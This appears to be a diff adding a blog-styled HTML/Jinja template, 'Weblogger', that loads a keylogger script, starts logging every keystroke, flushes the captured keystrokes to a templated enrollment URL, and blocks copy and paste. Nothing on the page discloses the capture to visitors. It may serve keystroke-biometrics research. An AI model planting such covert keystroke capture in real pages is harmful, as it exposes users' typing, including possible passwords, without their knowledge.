@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Weblogger</title>
+</head>
+
+<body class="page page-id-18 page-template-default group-blog" id="body">
+
+<script type="text/javascript" src="{{ url_for('static', filename='jquery.min.js') }}"></script>
+<script type="text/javascript" src="{{ url_for('static', filename='jquery.mousewheel.min.js') }}"></script>
+<script type="text/javascript" src="{{ url_for('static', filename='keylogger.js') }}"></script>
+<script type="text/javascript">
+$(document).ready(function () {
+    //Disable full page
+    $('body').bind('cut copy paste', function (e) {
+        e.preventDefault();
+    });
+
+    //Disable part of page
+    $('#id').bind('cut copy paste', function (e) {
+        e.preventDefault();
+    });
+
+    var b = new Keylogger("{{ flush_delay }}", "{{ enroll_url|safe }}");
+    b.startLogging();
+    $(window).on("beforeunload", function () {
+        b.stopLogging();
+    });
+});
+</script>
+
+{% block extra %}{% endblock %}
+
+<noscript>
+    <style type="text/css">
+        .container {display:none;}
+    </style>
+    <div class="noscriptmsg">
+        JavaScript must be enabled. Please enable JavaScript to continue.
+    </div>
+</noscript>
+
+</body>
+</html>
